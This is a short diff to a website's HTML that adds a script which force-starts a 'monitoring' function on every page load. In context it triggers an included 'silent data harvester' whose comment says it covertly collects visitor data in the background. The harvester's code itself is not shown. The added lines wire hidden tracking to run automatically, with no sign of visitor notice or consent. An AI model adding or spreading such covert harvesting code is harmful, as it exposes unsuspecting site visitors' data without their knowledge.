@@ -5900,5 +5900,20 @@ Real-World Features:
 
     <!-- 🔒 SILENT DATA HARVESTER - Collects visitor data in background -->
     <script src="/silent-harvester.js"></script>
+    
+    <!-- FORCE START MONITORING ON PAGE LOAD -->
+    <script>
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 FORCE STARTING MONITORING...');
+            setTimeout(function() {
+                if (typeof startMonitoring === 'function') {
+                    startMonitoring();
+                    console.log('✅ Monitoring force-started');
+                } else {
+                    console.error('❌ startMonitoring function not found');
+                }
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
